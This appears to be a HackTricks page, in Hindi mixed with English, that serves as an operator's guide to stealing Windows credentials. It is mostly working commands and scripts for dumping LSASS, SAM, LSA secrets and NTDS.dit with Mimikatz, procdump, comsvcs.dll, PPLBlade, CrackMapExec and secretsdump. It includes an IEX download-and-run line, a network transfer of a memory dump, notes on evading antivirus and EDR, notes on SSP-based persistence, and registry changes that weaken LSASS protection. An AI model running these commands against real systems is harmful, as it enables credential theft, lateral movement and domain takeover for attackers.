# Windows Credentials चुराना

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz और क्या कर सकता है यह जानने के लिए** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**यहाँ कुछ संभावित credentials सुरक्षा उपायों के बारे में जानें।**](credentials-protections.md) **ये सुरक्षा उपाय Mimikatz को कुछ credentials निकालने से रोक सकते हैं।**

## Meterpreter के साथ Credentials

[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **जो** मैंने बनाया है, का उपयोग करें ताकि victim के अंदर **passwords and hashes खोजे जा सकें**।
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को बायपास करना

### Procdump + Mimikatz

क्योंकि **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**एक वैध Microsoft टूल है**, इसलिए इसे Defender द्वारा डिटेक्ट नहीं किया जाता।\
आप इस टूल का उपयोग **lsass process को dump करने**, **dump डाउनलोड करने** और dump से **credentials को लोकली extract करने** के लिए कर सकते हैं।

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी उपयोग कर सकते हैं।
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: कुछ **AV** procdump.exe का उपयोग करके lsass.exe को डंप करने को **malicious** के रूप में **detect** कर सकते हैं, क्योंकि वे स्ट्रिंग **"procdump.exe" और "lsass.exe"** को **detect** कर रहे होते हैं। इसलिए lsass.exe के नाम की बजाय procdump को lsass.exe के **PID** को **argument** के रूप में पास करना अधिक **stealthier** होता है।

### lsass को **comsvcs.dll** से डंप करना

`C:\Windows\System32` में पाई जाने वाली **comsvcs.dll** नामक DLL क्रैश की स्थिति में प्रोसेस मेमोरी को **dumping process memory** के लिए जिम्मेदार है। इस DLL में **`MiniDumpW`** नामक एक **function** है, जिसे `rundll32.exe` के माध्यम से इनवोके करने के लिए डिज़ाइन किया गया है.\
पहले दो arguments का उपयोग अप्रासंगिक है, लेकिन तीसरा argument तीन घटकों में विभक्त होता है। डंप किए जाने वाले प्रोसेस का ID (PID) पहला घटक होता है, डंप फ़ाइल का स्थान दूसरा घटक है, और तीसरा घटक कड़ाई से शब्द **full** होता है। कोई वैकल्पिक विकल्प मौजूद नहीं है।\
इन तीन घटकों को पार्स करने के बाद, DLL डंप फ़ाइल बनाना शुरू कर देता है और निर्दिष्ट प्रोसेस की मेमोरी को उस फ़ाइल में स्थानांतरित कर देता है।\
**comsvcs.dll** का उपयोग lsass प्रोसेस को डंप करने के लिए किया जा सकता है, जिससे procdump को अपलोड और execute करने की आवश्यकता समाप्त हो जाती है। इस विधि का विवरण [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) पर उपलब्ध है।

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को स्वचालित कर सकते हैं** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Task Manager के साथ lsass डंप करना**

1. Task Bar पर राइट क्लिक करें और Task Manager पर क्लिक करें
2. More details पर क्लिक करें
3. Processes टैब में "Local Security Authority Process" प्रक्रिया खोजें
4. "Local Security Authority Process" प्रक्रिया पर राइट क्लिक करें और "Create dump file" पर क्लिक करें।

### procdump के साथ lsass डंप करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft द्वारा साइन किया गया एक बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सूट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## lsass को PPLBlade के साथ डंप करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है जो memory dump को obfuscate करने और उसे remote workstations पर transfer करने का समर्थन करता है बिना इसे disk पर drop किए।

**मुख्य कार्यक्षमताएँ**:

1. PPL protection को बायपास करना
2. Defender signature-based detection mechanisms से बचने के लिए memory dump files को obfuscate करना
3. disk पर drop किए बिना RAW और SMB upload methods के माध्यम से memory dump upload करना (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon एक तीन-स्टेज dumper के साथ आता है जिसे **LalsDumper** कहा जाता है जो कभी भी `MiniDumpWriteDump` को कॉल नहीं करता, इसलिए उस API पर EDR hooks कभी फायर नहीं होते:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में एक placeholder खोजता है जो 32 लोअर-केस `d` characters से बना होता है, उसे `rtu.txt` के absolute path से overwrite करता है, patched DLL को `nfdp.dll` के रूप में save करता है, और `AddSecurityPackageA("nfdp","fdp")` को कॉल करता है। यह मजबूर करता है कि **LSASS** malicious DLL को एक नए Security Support Provider (SSP) के रूप में load करे।
2. **Stage 2 inside LSASS** – जब LSASS `nfdp.dll` को लोड करता है, तो DLL `rtu.txt` को पढ़ता है, प्रत्येक बाइट को `0x20` से XOR करता है, और decoded blob को memory में map करता है उसके बाद execution ट्रांसफर करता है।
3. **Stage 3 dumper** – mapped payload MiniDump logic को फिर से implement करता है **direct syscalls** का उपयोग करके जिन्हें hashed API names से resolve किया जाता है (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). एक dedicated export नाम `Tom` `%TEMP%\<pid>.ddt` खोलता है, फाइल में एक compressed LSASS dump स्ट्रीम करता है, और handle को बंद कर देता है ताकि बाद में exfiltration हो सके।

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, और `rtu.txt` को एक ही directory में रखें। Stage 1 hard-coded placeholder को `rtu.txt` के absolute path से rewrite करता है, इसलिए इन्हें अलग करने से chain टूट जाती है।
* Registration `nfdp` को `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में append करके होती है। आप खुद उस value को seed कर सकते हैं ताकि LSASS हर boot पर SSP को reload करे।
* `%TEMP%\*.ddt` फाइलें compressed dumps हैं। लोकली उन्हें decompress करें, फिर credential extraction के लिए Mimikatz/Volatility को feed करें।
* `lals.exe` चलाने के लिए admin/SeTcb rights चाहिए ताकि `AddSecurityPackageA` सफल हो; जब call return कर देता है, तो LSASS transparently rogue SSP को load कर लेता है और Stage 2 execute होता है।
* डिस्क से DLL हटाने से वह LSASS से evict नहीं होता। या तो registry entry डिलीट कर के LSASS restart करें (reboot) या इसे long-term persistence के लिए छोड़ दें।

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्षित DC से NTDS.dit को Dump करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्ष्य DC से NTDS.dit पासवर्ड इतिहास निकालें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit खाते के लिए pwdLastSet एट्रीब्यूट दिखाएँ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

ये फ़ाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_ में **स्थित** होनी चाहिए। लेकिन **आप उन्हें सामान्य तरीके से सीधे कॉपी नहीं कर सकते** क्योंकि वे संरक्षित हैं।

### From Registry

इन फ़ाइलों को चुराने का सबसे आसान तरीका रजिस्ट्री से एक कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** उन फ़ाइलों को अपनी Kali मशीन पर डाउनलोड करें और **extract the hashes** निकालने के लिए निम्नलिखित का उपयोग करें:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस सेवा का उपयोग करके सुरक्षित फ़ाइलों की कॉपी कर सकते हैं। आपको Administrator होना आवश्यक है।

#### Using vssadmin

vssadmin binary केवल Windows Server संस्करणों में ही उपलब्ध है।
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप यही काम **Powershell** से भी कर सकते हैं। यह **how to copy the SAM file** का एक उदाहरण है (हार्ड ड्राइव जिसका उपयोग "C:" किया गया है और यह C:\users\Public में सेव किया गया है), लेकिन आप इसे किसी भी संरक्षित फ़ाइल की नकल करने के लिए उपयोग कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
पुस्तक से कोड: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

अंत में, आप [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग SAM, SYSTEM और ntds.dit की एक कॉपी बनाने के लिए भी कर सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** फ़ाइल को **Active Directory** का दिल कहा जाता है, यह user objects, groups और उनकी memberships के बारे में महत्वपूर्ण डेटा रखती है। यही वह जगह है जहाँ domain users के **password hashes** स्टोर होते हैं। यह फ़ाइल एक **Extensible Storage Engine (ESE)** database है और यह **_%SystemRoom%/NTDS/ntds.dit_** पर स्थित रहती है।

Within this database, three primary tables are maintained:

- **Data Table**: यह table users और groups जैसे objects के विवरण स्टोर करने का काम करती है।
- **Link Table**: यह relationships को ट्रैक करती है, जैसे group memberships।
- **SD Table**: यहाँ प्रत्येक object के लिए **Security descriptors** रखे जाते हैं, जिससे stored objects की security और access control सुनिश्चित होती है।

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows _Ntdsa.dll_ का उपयोग उस फ़ाइल के साथ इंटरैक्ट करने के लिए करता है और यह _lsass.exe_ द्वारा उपयोग किया जाता है। फिर, **part** of the **NTDS.dit** file **inside the `lsass`** memory में स्थित हो सकता है (आप नवीनतम एक्सेस किए गए डेटा को पा सकते हैं, संभवतः performance सुधार के लिए **cache** के उपयोग के कारण)।

#### Decrypting the hashes inside NTDS.dit

हैश तीन बार cipher किया जाता है:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt the **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** का **same value** हर **domain controller** में होता है, लेकिन यह **NTDS.dit** फ़ाइल के अंदर **BOOTKEY** का उपयोग करके **cyphered** होता है जो उस **SYSTEM file of the domain controller (is different between domain controllers)** का होता है। इसलिए NTDS.dit फ़ाइल से credentials प्राप्त करने के लिए **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_)।

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप [**volume shadow copy**](#stealing-sam-and-system) तरीका का उपयोग करके **ntds.dit** फ़ाइल कॉपी कर सकते हैं। ध्यान रखें कि आपको **SYSTEM file** की एक प्रति भी चाहिए (फिर से, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) तरीका)।

### **NTDS.dit से hashes निकालना**

एक बार जब आपके पास फाइलें **NTDS.dit** और **SYSTEM** **प्राप्त** हो जाएँ, तो आप _secretsdump.py_ जैसे टूल्स का उपयोग करके **hashes निकाल सकते हैं**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक वैध domain admin user का उपयोग करके उन्हें भी **स्वचालित रूप से निकाल सकते हैं**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ or **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit से domain objects को SQLite database में निकालना**

NTDS ऑब्जेक्ट्स को [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) के साथ एक SQLite database में निकाला जा सकता है। न सिर्फ secrets निकाले जाते हैं बल्कि पूरे ऑब्जेक्ट्स और उनके attributes भी निकाले जाते हैं ताकि आगे की जानकारी निकालने के लिए इस्तेमाल किया जा सके जब raw NTDS.dit file पहले से ही प्राप्त हो।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive वैकल्पिक है, लेकिन यह secrets को decrypt करने की अनुमति देता है (NT & LM hashes, supplemental credentials जैसे cleartext passwords, kerberos या trust keys, NT & LM password histories). अन्य जानकारी के साथ, निम्नलिखित डेटा निकाला जाता है : user और machine accounts उनके hashes के साथ, UAC flags, last logon और password change के लिए timestamp, accounts का description, names, UPN, SPN, groups और recursive memberships, organizational units tree और membership, trusted domains साथ में trusts का type, direction और attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). आप इस binary का उपयोग कई software से credentials निकालने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से credentials निकालने के अन्य उपकरण

### Windows credentials Editor (WCE)

यह टूल मेमोरी से credentials निकालने के लिए उपयोग किया जा सकता है। इसे डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file से credentials निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM file से credentials निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे इस स्थान से डाउनलोड करें:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस **इसे चलाएँ** और पासवर्ड एक्सट्रैक्ट हो जाएंगे।

## निष्क्रिय RDP सेशन्स का खनन और सुरक्षा नियंत्रणों को कमजोर करना

Ink Dragon’s FinalDraft RAT में `DumpRDPHistory` tasker शामिल है, जिसकी तकनीकें किसी भी red-teamer के लिए उपयोगी होती हैं:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – हर user hive को `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर parse करें। हर subkey में server name, `UsernameHint`, और last write timestamp स्टोर होता है। आप FinalDraft की लॉजिक को PowerShell से replicate कर सकते हैं:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – किसने बॉक्स का प्रशासन किया यह मैप करने के लिए `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` लॉग में Event IDs **21** (successful logon) और **25** (disconnect) के लिए query करें:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

एक बार जब आप जान लें कि कौन सा Domain Admin नियमित रूप से कनेक्ट करता है, तो उनके **disconnected** session अभी भी मौजूद रहते हुए LSASS dump करें (LalsDumper/Mimikatz के साथ)। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें बाद में SMB/WinRM के जरिए replay करके `NTDS.dit` पकड़ने या domain controllers पर persistence stage करने में इस्तेमाल किया जा सकता है।

### Registry downgrades targeted by FinalDraft

वही implant कई registry keys में छेड़छाड़ भी करता है ताकि credential theft आसान हो सके:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` सेट करने से RDP के दौरान पूर्ण credential/ticket reuse मजबूर होता है, जिससे pass-the-hash style pivots सक्षम होते हैं।
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को अक्षम करता है ताकि local admins नेटवर्क पर unrestricted tokens प्राप्त कर सकें।
* `DSRMAdminLogonBehavior=2` DSRM administrator को DC online रहते हुए भी log on करने देता है, जिससे attackers को एक और built-in high-privilege account मिल जाता है।
* `RunAsPPL=0` LSASS PPL protections को हटाता है, जिससे memory access dumpers जैसे LalsDumper के लिए सहज हो जाता है।

## संदर्भ

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
